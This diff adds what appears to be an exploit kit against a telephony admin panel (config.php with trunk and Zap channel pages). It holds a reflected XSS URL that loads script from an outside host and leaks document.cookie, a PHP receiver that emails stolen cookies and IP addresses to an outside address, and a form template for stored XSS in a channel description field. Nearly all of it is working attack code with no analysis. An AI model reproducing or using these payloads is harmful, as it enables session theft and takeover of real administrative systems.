@@ -1,0 +1,28 @@
+location.href='https://www.example.com/admin/admin/config.php?display=trunks&tech=%3C/script%3E%20%22%3E
+%3Cscript%20src%3Dhttp%3A//global-evolution.info/etc/grep.php%3E%3C/script%3E?nice='+escape(document.cookie)
+
+<?
+$cookie = $_GET['nice'];
+$ip = getenv("REMOTE_ADDR");
+$Time = date("l dS of F Y h:i:s A");
+$msg = "Cookie: $cookie\nIP Address: $ip\Time: $Time";
+$subject = "cookie";
+mail("notification@global-evolution.info", $subject, $msg);
+header ("location: http://127.0.0.1:8080/admin/");
+?>
+
+
+<form name="editZapchandid" action="" method="post" onsubmit="return checkZapchandid(editZapchandid);">
+<input type="hidden" name="extdisplay" value="">
+<input type="hidden" name="channel" value="">
+<input type="hidden" name="action" value="add">
+<table><tr><td colspan="2"><h5>Add Channel<hr></h5></td></tr>
+<tr><td><a href="#" class="info">Channel:<span>The Zap Channel number to map to a DID</span></a></td>
+<td><input size="5" type="text" name="channel" value="" tabindex="1"></td>
+</tr><tr><td><a href="#" class="info">Description:<span>A useful description describing this channel</span></a></td>
+<td><input size="40" type="text" name="description" value="INSERT 0WN SCRIPTCODE HERE!!!" tabindex="2"></td>
+</tr><tr><td><a href="#" class="info">DID:<span>The DID that this channel represents. The incoming call on this channel
+will be treated as if it came in with this DID and can be managed with Inbound Routing on DIDs</span></a></td>
+<td><input size="40" type="text" name="did" value="" tabindex="3"/></td>
+</tr><tr><td colspan="2"><br><input name="Submit" type="submit" value="Submit Changes" tabindex="4">
+</td></tr></table></form>
